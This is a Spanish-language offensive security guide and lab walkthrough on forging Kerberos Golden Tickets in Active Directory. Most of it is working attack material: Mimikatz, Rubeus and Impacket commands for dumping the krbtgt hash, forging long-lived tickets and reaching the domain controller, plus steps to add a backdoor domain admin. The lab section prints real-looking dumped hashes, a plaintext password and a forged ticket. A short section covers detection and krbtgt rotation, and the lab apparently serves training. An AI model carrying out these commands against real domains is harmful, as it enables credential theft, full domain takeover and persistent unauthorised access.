
# Golden Ticket

## <mark style="color:$primary;">¿Qué es un Golden Ticket?</mark>

Un **Golden Ticket** es un **Ticket Granting Ticket (TGT)** falsificado que te permite **actuar como cualquier usuario** del dominio, con cualquier nivel de privilegio, sin límite de tiempo (o con expiración extendida).

{% hint style="danger" %}
💀 **El ataque definitivo**: Con un Golden Ticket, tienes **God-Mode** en el dominio. Puedes acceder a cualquier recurso, de cualquier usuario, en cualquier momento.
{% endhint %}

#### ¿Por qué funciona?

El KDC (Domain Controller) no "verifica" el TGT contra una base de datos cuando lo recibes. Simplemente confía que está firmado correctamente... y tú tienes la clave para firmarlo: **el hash de krbtgt**.

***

#### 🎯 Golden Ticket vs Silver Ticket

| Característica                          | Silver Ticket                  | Golden Ticket              |
| --------------------------------------- | ------------------------------ | -------------------------- |
| **Ticket falsificado**                  | TGS (para un servicio)         | TGT (para todo el dominio) |
| **Hash necesario**                      | Hash del **servicio objetivo** | Hash de **krbtgt**         |
| **Alcance**                             | Un servicio en un equipo       | **Todo el dominio**        |
| **Puedes ser cualquier usuario**        | ❌ No                           | ✅ **Sí**                   |
| **Puedes acceder a cualquier servicio** | ❌ Solo el especificado         | ✅ **Sí**                   |
| **Contacta al KDC**                     | ❌ No                           | ✅ Sí (al pedir TGS)        |
| **Persistencia**                        | Baja (limitado a un servicio)  | **Total** (dominio entero) |
| **Detección**                           | Difícil                        | Más fácil (logs anómalos)  |

***

#### 🛠️ ¿Qué necesitas para crear un Golden Ticket?

| Requisito                          | Cómo obtenerlo                  | Importancia    |
| ---------------------------------- | ------------------------------- | -------------- |
| **Hash NTLM de krbtgt**            | DCSync, dumping NTDS.dit, LSASS | 🏆 **CRÍTICO** |
| **SID del dominio**                | `whoami /user`, PowerView       | 🔴 Necesario   |
| **Nombre del dominio**             | Conocimiento básico             | 🟢 Fácil       |
| (Opcional) **Clave AES de krbtgt** | DCSync con parámetros adecuados | 🔵 Para AES    |

#### ¿Cómo obtener el hash de krbtgt?

```bash
# Desde Windows (con Mimikatz - DCSync)
mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:research.SECURITY.local" "exit"

# Desde Windows (NTDS.dit - si tienes acceso al DC)
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
# Enviar a Kali
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# Desde Kali (DCSync con credenciales)
impacket-secretsdump -just-dc research.SECURITY.local/administrador:password@prod.research.SECURITY.local

# Desde Kali (si tienes acceso al DC como archivo)
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

***

## <mark style="color:$primary;">Cheatsheet</mark>

### 🪟 Windows (Mimikatz)

#### **Paso 1: Obtener SID del dominio y hash de krbtgt**

```powershell
# Obtener SID del dominio
whoami /user
# Ejemplo: S-1-5-21-1693200156-3137632808-1858025440-1115
# SID dominio: S-1-5-21-1693200156-3137632808-1858025440

# Obtener hash de krbtgt (DCSync)
mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:research.SECURITY.local" "exit"
```

#### **Paso 2: Crear Golden Ticket**

```powershell
# Opción 1: Con hash NTLM (RC4) - MÁS COMÚN
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /rc4:HASH_KRBTGT /user:Administrador /id:500 /ptt"

# Opción 2: Con clave AES256 (más moderno, menos detectable)
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /aes256:CLAVE_AES256_KRBTGT /user:Administrador /id:500 /ptt"

# Opción 3: Ticket que NO EXPIRE (persistencia máxima)
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /rc4:HASH_KRBTGT /user:Administrador /id:500 /ptt /endin:5760000"

# Opción 4: Ser otro usuario (no solo Administrador)
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /rc4:HASH_KRBTGT /user:maintainer /id:1115 /ptt"

# Opción 5: Guardar ticket a archivo (sin inyectar)
mimikatz.exe "kerberos::golden /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /rc4:HASH_KRBTGT /user:Administrador /id:500 /ticket:golden.kirbi"
```

#### **Paso 3: Verificar e inyectar**

```powershell
# Ver tickets inyectados
klist

# Si guardaste el ticket, inyectar después
mimikatz.exe "kerberos::ptt golden.kirbi" "exit"
```

#### **Paso 4: Usar el Golden Ticket**

```powershell
# Acceder al DC
dir \\prod.research.SECURITY.local\c$

# PsExec al DC
PsExec.exe -accepteula \\prod.research.SECURITY.local cmd

# WinRM al DC
Enter-PSSession -ComputerName prod.research.SECURITY.local

# Mapear unidad
net use Z: \\prod.research.SECURITY.local\c$
```

### 🪟 Windows (Rubeus)

```powershell
# Rubeus también puede crear Golden Tickets
Rubeus.exe golden /rc4:HASH_KRBTGT /user:Administrador /id:500 /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /ptt

# Con AES256
Rubeus.exe golden /aes256:CLAVE_AES256 /user:Administrador /id:500 /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /ptt
```

### 🐉 Kali Linux (Impacket)

#### **Paso 1: Crear Golden Ticket**

```bash
# Con ticketer.py (hash RC4)
impacket-ticketer -nthash HASH_KRBTGT -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -user-id 500 Administrador

# Con AES256
impacket-ticketer -aes-key CLAVE_AES256_KRBTGT -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -user-id 500 Administrador

# Crear ticket para un usuario específico (no Administrador)
impacket-ticketer -nthash HASH_KRBTGT -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -user-id 1115 maintainer

# Ticket con expiración extendida (años)
impacket-ticketer -nthash HASH_KRBTGT -domain-sid S-1-5-21-1693200156-3137632808-1858025440 -domain research.SECURITY.local -user-id 500 -duration 365 Administrador
```

#### **Paso 2: Usar el ticket**

```bash
# Exportar variable de entorno
export KRB5CCNAME=$(pwd)/Administrador.ccache

# Verificar ticket
impacket-klist -k Administrador.ccache

# Usar con impacket (SON CLAVES -k y -no-pass)
impacket-psexec -k -no-pass -dc-ip 192.168.1.10 research.SECURITY.local/Administrador@prod.research.SECURITY.local

# Acceso a C$ con smbclient
smbclient //prod.research.SECURITY.local/C$ -k -no-pass

# Ejecutar comandos con wmiexec
impacket-wmiexec -k -no-pass -dc-ip 192.168.1.10 research.SECURITY.local/Administrador@prod.research.SECURITY.local "whoami"

# Dumpear NTDS.dit (aunque ya tienes el hash de krbtgt)
impacket-secretsdump -k -no-pass -dc-ip 192.168.1.10 research.SECURITY.local/Administrador@prod.research.SECURITY.local -just-dc
```

***

## <mark style="color:$primary;">Flujo completo del ataque</mark>

```
Paso 1: Comprometer un equipo con privilegios de dominio
        ↓
   Admin local en algún equipo, credenciales de usuario, etc.
        ↓
Paso 2: Obtener hash de krbtgt
        ↓
   DCSync (si tienes permisos), NTDS.dit, LSASS del DC
        ↓
Paso 3: Crear Golden Ticket
        ↓
   Mimikatz, Rubeus o ticketer.py
        ↓
Paso 4: Inyectar ticket
        ↓
   /ptt o export KRB5CCNAME
        ↓
Paso 5: Acceder a CUALQUIER recurso del dominio
        ↓
   DC, servidores, estaciones, cualquier servicio
        ↓
Paso 6: Persistencia (crear puerta trasera)
        ↓
   Crear usuario, modificar ACL, etc.
```

***

## <mark style="color:$primary;">Usos avanzados del Golden Ticket</mark>

#### 1. Crear usuarios en el dominio

```powershell
# Con el ticket inyectado, puedes crear usuarios con net user
net user hacker P@ssw0rd123 /add /domain
net localgroup "Domain Admins" hacker /add /domain
```

#### 2. Modificar configuración de Kerberos

```powershell
# Cambiar políticas de contraseña de krbtgt
mimikatz.exe "lsadump::setntlm /user:krbtgt /password:NuevaPassword123"
```

#### 3. Golden Ticket para múltiples servicios

```powershell
# No necesitas múltiples Golden Tickets, uno solo TGT sirve para todo
# Pero puedes crear uno con grupos adicionales
mimikatz.exe "kerberos::golden /domain:... /sid:... /rc4:... /user:Administrador /id:500 /groups:512,513,518,519,520 /ptt"
```

#### 4. Persistencia extrema (Golden Ticket con 10 años de validez)

```powershell
# Ticket que caduca en 10 años (5256000 minutos)
mimikatz.exe "kerberos::golden /domain:... /sid:... /rc4:... /user:Administrador /id:500 /ptt /endin:5256000"
```

***

#### ⚠️ Limitaciones y consideraciones

| Limitación                          | Explicación                                    | Solución                          |
| ----------------------------------- | ---------------------------------------------- | --------------------------------- |
| **Necesitas hash krbtgt**           | Es la clave maestra del dominio                | DCSync, NTDS.dit, LSASS del DC    |
| **Cambios de contraseña de krbtgt** | Los Golden Tickets viejos dejan de funcionar   | Si rotan krbtgt, regenerar ticket |
| **Detección por anomalías**         | Eventos 4624, 4768, 4769 con patrones extraños | Usar tickets con usuarios reales  |
| **Post-Nov 2021**                   | El usuario debe existir en el dominio          | Usar Administrador o usuario real |
| **Diferencia horaria**              | El DC rechaza tickets con desfase >5 minutos   | Sincronizar hora con DC           |

## Detección de Golden Ticket

Los Blue Teams pueden detectar Golden Tickets identificando:

<table data-header-hidden><thead><tr><th width="336"></th><th></th></tr></thead><tbody><tr><td>Anomalía</td><td>Comando de detección</td></tr><tr><td>TGT con Ticket Flags anómalas</td><td><code>klist</code> en el DC</td></tr><tr><td>Usuarios inexistentes</td><td>Evento 4768 con usuario que no existe</td></tr><tr><td>IDs de grupo inusuales (e.g., 999)</td><td>Eventos 4624 y 4769</td></tr><tr><td>Fechas de expiración muy largas</td><td>Evento 4768 con EndTime lejano</td></tr><tr><td>Sesiones de usuario sin cambios de contraseña</td><td>Análisis de comportamiento</td></tr></tbody></table>

***

## <mark style="color:$primary;">¿Cómo protegerte de Golden Ticket?</mark>

| Medida                                      | Descripción                                | Efectividad       |
| ------------------------------------------- | ------------------------------------------ | ----------------- |
| **Rotar contraseña de krbtgt regularmente** | Cada 30-60 días (requiere 2 cambios)       | 🏆 MÁS IMPORTANTE |
| **Limitar permisos de replicación**         | Restringir quién puede hacer DCSync        | ✅ Alta            |
| **Usar Managed Service Accounts**           | Rotación automática de contraseñas         | ✅ Media           |
| **Credential Guard**                        | Protege LSASS en equipos Windows           | ✅ Media           |
| **Monitoreo de eventos anómalos**           | Herramientas SIEM                          | ✅ Alta            |
| **Auditar sesiones anómalas**               | Usuarios que inician sesión sin contraseña | ✅ Alta            |

#### Cómo rotar krbtgt correctamente (Blue Team):

```powershell
# Requiere dos cambios con intervalo de 12-24 horas
# Primero generar nueva contraseña
$NewPassword = (New-Guid).ToString()
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString $NewPassword -AsPlainText -Force)

# Después de 12-24 horas, repetir el proceso
# En Windows 2022+, se recomienda usar:
Reset-ADAccountPassword -Identity krbtgt -ResetToRandom
```

***

## <mark style="color:$primary;">Resumen completo</mark>

<table data-header-hidden><thead><tr><th width="169.33331298828125"></th><th width="182"></th><th width="103.33331298828125"></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Ataque</td><td>Hash necesario</td><td>Ticket</td><td>Alcance</td><td>Persistencia</td><td>Dificultad detección</td></tr><tr><td><strong>AS-REP Roasting</strong></td><td>N/A (crackeable)</td><td>AS-REP</td><td>Un usuario</td><td>Baja</td><td>Media</td></tr><tr><td><strong>Kerberoasting</strong></td><td>N/A (crackeable)</td><td>TGS</td><td>Servicio</td><td>Baja</td><td>Media</td></tr><tr><td><strong>Pass-the-Hash</strong></td><td>Hash NT del usuario</td><td>N/A</td><td>Depende permisos</td><td>Baja</td><td>Media</td></tr><tr><td><strong>Pass-the-Ticket</strong></td><td>N/A (ticket robado)</td><td>TGT/TGS</td><td>Variable</td><td>Baja</td><td>Difícil</td></tr><tr><td><strong>Silver Ticket</strong></td><td>Hash del servicio</td><td>TGS</td><td>Un servicio</td><td>Media</td><td>Difícil</td></tr><tr><td><strong>Golden Ticket</strong></td><td>Hash de <strong>krbtgt</strong></td><td><strong>TGT</strong></td><td><strong>DOMINIO COMPLETO</strong></td><td><strong>Total</strong></td><td>Difícil</td></tr></tbody></table>

***

### 📌 Notas finales

1. **Con el hash de krbtgt eres Dios en el dominio** - nada te detiene
2. **Los Golden Tickets NO expiran** a menos que especifiques `/endin`
3. **No requieres interacción con el DC** hasta que pides un TGS
4. **El mayor riesgo para los Blue Teams** es la rotación incorrecta de krbtgt
5. **En entornos reales**, muchas empresas NUNCA rotan la contraseña de krbtgt (silencio de radio)

***

## <mark style="color:$primary;">Lab: Golden Ticket Attacks</mark>

En este entorno de laboratorio, el acceso a la interfaz gráfica de usuario (GUI) de una máquina con Windows Server 2012 funciona como su estación de trabajo. Ha iniciado sesión con la cuenta de usuario de dominio "Research/Student". Esta estación de trabajo se ha configurado con vulnerabilidades relacionadas con ataques Golden Ticket, una potente forma de manipulación de Kerberos, que proporciona un escenario real para practicar sus habilidades de ciberseguridad.

Tu tarea consiste en simular un ataque de "Golden Ticket" para explotar la vulnerabilidad del ticket-granting ticket (TGT) de Kerberos. Si se ejecuta correctamente, podrías obtener amplios privilegios y control sobre el dominio de Active Directory.

**Objetivo: Simular un ataque Kerberos Golden Ticket para generar un TGT y escalar privilegios para obtener acceso al controlador de dominio.**

Las mejores herramientas para este laboratorio son:

* `PowerView`
* `Invoke-Mimikatz`

### Tarea 1

> Extraer el hash NTML del administrador

En una powershell como admin importamos las herramientas:

```powershell
PS C:\Windows\system32> cd C:\Tools
PS C:\Tools> powershell -ep bypass
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> . .\Invoke-Mimikatz.ps1
```

#### Mimikatz logonpasswords

```powershell
PS C:\Tools> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # sekurlsa::logonpasswords

<----SNIP---->

Authentication Id : 0 ; 248871 (00000000:0003cc27)
Session           : Interactive from 1
User Name         : Administrator
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 4/29/2026 10:13:44 AM
SID               : S-1-5-21-1693200156-3137632808-1858025440-500
        msv :
         [00010000] CredentialKeys
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
         [00000003] Primary
         * Username : Administrator
         * Domain   : RESEARCH
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : Hello_World123
<----SNIP---->
```

Obtenemos:

* El hash de administrator: `84398159ce4d01cfe10cf34d5dae3909`
* Su contraseña en plano: `Hello_World123`

***

### Tarea 2

> Ejecutar un ataque Pass-the-Hash

#### Mimikatz Pass the Hash

```powershell
PS C:\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909"'
```

<figure><img src="/files/KKkT56TDxe67oZInMBxu" alt=""><figcaption></figcaption></figure>

***

### Tarea 3

> Recuperar el hash de la cuenta KRBTGT

#### Hash Dump del DC con Mimikatz

Desde la nueva CMD como admin:

```powershell
C:\Windows\system32>cd c:/Tools
c:\Tools>powershell -ep bypass
PS C:\Tools> . .\Invoke-Mimikatz.ps1
```

```powershell
PS C:\Tools> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername prod.research.security.local

Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-185802
5440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : RESEARCH / S-1-5-21-1693200156-3137632808-1858025440

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 84398159ce4d01cfe10cf34d5dae3909

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 0e3cab3ba66afddb664025d96a8dc4d2

RID  : 000003f1 (1009)
User : PROD$
LM   :
NTLM : 2513548150da1f384c08ab973f0def9b

<----SNIP---->
```

Tenemos el hash de la cuenta KRBTGT: `0e3cab3ba66afddb664025d96a8dc4d2` y ru RID(502)

***

### Tarea 4

> Generar e implementar un Golden Ticket

#### Golden Ticker con Mimikatz

En la primera Powershell como Admin:

```powershell
PS C:\Tools> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440-500 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 /id:502 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt"'

Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::golden /user:Administrator /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440-500 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 /id:502 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : research.security.local (RESEARCH)
SID       : S-1-5-21-1693200156-3137632808-1858025440-500
User Id   : 502
Groups Id : *512
ServiceKey: 0e3cab3ba66afddb664025d96a8dc4d2 - rc4_hmac_nt
Lifetime  : 4/29/2026 10:45:47 AM ; 4/26/2036 10:45:47 AM ; 5/6/2026 10:45:47 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ research.security.local' successfully submitted for current session
```

#### Golden Ticket con Rubeus

```powershell
PS C:\Tools> .\Rubeus.exe golden /rc4:0e3cab3ba66afddb664025d96a8dc4d2 /user:Administrador /id:500 /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : RESEARCH.SECURITY.LOCAL (RESEARCH)
[*] SID            : S-1-5-21-1693200156-3137632808-1858025440
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 0E3CAB3BA66AFDDB664025D96A8DC4D2
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 0E3CAB3BA66AFDDB664025D96A8DC4D2
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : research.SECURITY.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrador@research.SECURITY.local'

[*] AuthTime       : 4/29/2026 11:18:54 AM
[*] StartTime      : 4/29/2026 11:18:54 AM
[*] EndTime        : 4/29/2026 9:18:54 PM
[*] RenewTill      : 5/6/2026 11:18:54 AM

[*] base64(ticket.kirbi):

      doIFqTCCBaWgAwIBBaEDAgEWooIEgTCCBH1hggR5MIIEdaADAgEFoRkbF1JFU0VBUkNILlNFQ1VSSVRZ
      LkxPQ0FMoiwwKqADAgECoSMwIRsGa3JidGd0GxdyZXNlYXJjaC5TRUNVUklUWS5sb2NhbKOCBCMwggQf
      oAMCARehAwIBA6KCBBEEggQN2Ubxf5e4o9rosQFoUNmQORdYZ92Gm9PshrOdymAvRVnqs3txNLZdVmN9
      0zJDEbu6xzZJak9mlQLPs9T/MDR5agfZBz1aZZVjLKiW7aUPamo3uvLBkX/7aeWuAswBpElsreRSQNUk
      XmRsF40Lo69Ms+UBBZzvo6/5Fd7RxjlFRjeYAwilWsFJZ+skioOk10OPGD+Lihsm1oxPA/p1n0coSYFQ
      458cTahbDXxY8HVbGOEr3Db6k+x8/TGm743PNhyTVUTi115dFgnm70NQbyhiS47nYipSb3s3ksuBOTnW
      LRLkrq1ccAjF47PxSZbTb32KPjsc9YhqlJBTfyq+n/9TVZWPXQkzeqKwQ+fui7TTuJC1pkHHxeyPhF5Q
      Y+QwdamjYU2GSWFT29QnBV3dso2r3nrxTkdXzH3ja+iiQvPGbHSgm5rPB+pq8CtGFpMYFLDnEuwgQJet
      9szfAKLyxDGmvj7s4/AqwK00sSSx6Zrojf8ziQfMCOq3XUDiOMxKI8n6LhyoGD2yj6d585Qgo6jmmeCc
      N+rZIJQcmPTsw+DsuNIB1rF2LygTDp3iKCvskXC144crKYLXjzkC2cW/IK28wLSF6suCjBCRonqRogTh
      V6ll7YZ95YCZFVDl0b0G+rB6gYfdTBDe3SD+ghervzElGj34cIEoJZf2xsdIizWdppSB1zILGG8AwxBG
      MumdqWQ5IM8/xBEYX+VRKCrHGRGpiIf+ojNFQF+/ev4y9KJZTkWKFOITTbQMaOAbsCtbQH+Olr4M6Cmu
      qn875jAxV00otCYxq3TXgmnU0zEvOOnYYzsT9d2eiXJPkIS2o0kK7MsBsWAi/LIZ6GqHj1GEeL41YcQd
      I8+YAlOVaAkW0JTmxeF4IQQpkLQHfh0zc1PBywEwMvSeVotMQBigzzXbvYjMUkJgbqahlpYXEz7XLBJx
      evb6/qQGMaUxCJnIXCfL7a1OLbtGVGAKgTOM4puC6qCwoziRCA6ahp7rPlqO01JV4ascdlQJvOHIwQqF
      iCwDm7299DO7T86K3lJBVzRl3YQh6PYpIlnMP1fXxzEEgouIwe5HOCJ31IkehrvwXams3gVPF6WRKf8+
      /JL3YDIUmcVjNYNTYtQZZZ7weSlQXJMpsY98EDzCMkg/5qrZsndFR7aqrIQPaPQtdfIYDojr9filHq80
      c2KSR0VoFAuxU9g0PffqiEilHk+oH6NdNBxl3m7hoWX4haKx5X5tvQj6rp9XZZlLRQFNHMyr4Q7Bsxdl
      9i9YXXaF30k7WbfIaSCDUZiWsaCTUtKZACZtdIXb3oauZH2G2Sf87nbYguUzsvZmZpJF4PjRkrcj69Rr
      pl+tqUZpyiklEEsX+feiohjjbrVeGj6ijhfvrLuJnzBsH22jggESMIIBDqADAgEAooIBBQSCAQF9gf4w
      gfuggfgwgfUwgfKgGzAZoAMCARehEgQQkQT0Y/LFo1Mss1X4emXW6KEZGxdSRVNFQVJDSC5TRUNVUklU
      WS5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmFkb3KjBwMFAEDgAACkERgPMjAyNjA0MjkxMTE4
      NTRapREYDzIwMjYwNDI5MTExODU0WqYRGA8yMDI2MDQyOTIxMTg1NFqnERgPMjAyNjA1MDYxMTE4NTRa
      qBkbF1JFU0VBUkNILlNFQ1VSSVRZLkxPQ0FMqSwwKqADAgECoSMwIRsGa3JidGd0GxdyZXNlYXJjaC5T
      RUNVUklUWS5sb2NhbA==

[+] Ticket successfully imported!
```

***

### Tarea 5

> Validar el acceso al controlador de dominio

#### Domain SID

```powershell
PS C:\Tools> Get-DomainSID
S-1-5-21-1693200156-3137632808-1858025440
```

Al crear Golden Tickets, a veces en necesario purgar los tickers en memoria con este comando:

```
klist purge
```

```powershell
PS C:\Tools> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 /id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt"'

Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::golden /user:Administrator /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440-500 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 /id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : research.security.local (RESEARCH)
SID       : S-1-5-21-1693200156-3137632808-1858025440-500
User Id   : 500
Groups Id : *512
ServiceKey: 0e3cab3ba66afddb664025d96a8dc4d2 - rc4_hmac_nt
Lifetime  : 4/29/2026 10:49:38 AM ; 4/26/2036 10:49:38 AM ; 5/6/2026 10:49:38 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ research.security.local' successfully submitted for current session
```

#### Comprobar ticket en memoria

```powershell
PS C:\Tools> klist

Current LogonId is 0:0x4ba2f

Cached Tickets: (1)

#0>     Client: Administrator @ research.security.local
        Server: krbtgt/research.security.local @ research.security.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 4/29/2026 10:58:42 (local)
        End Time:   4/26/2036 10:58:42 (local)
        Renew Time: 5/6/2026 10:58:42 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

#### Acceso al Domain Controller

```powershell
PS C:\Tools> cd \\prod.research.SECURITY.local\c$
PS Microsoft.PowerShell.Core\FileSystem::\\prod.research.SECURITY.local\c$> ls

    Directory: \\prod.research.SECURITY.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/22/2013   3:52 PM                PerfLogs
d-r---        5/31/2023  10:23 AM                Program Files
d-----        9/21/2021  12:28 PM                Program Files (x86)
d-r---        9/27/2021   9:00 AM                Users
d-----        9/27/2021   9:19 AM                Windows
```
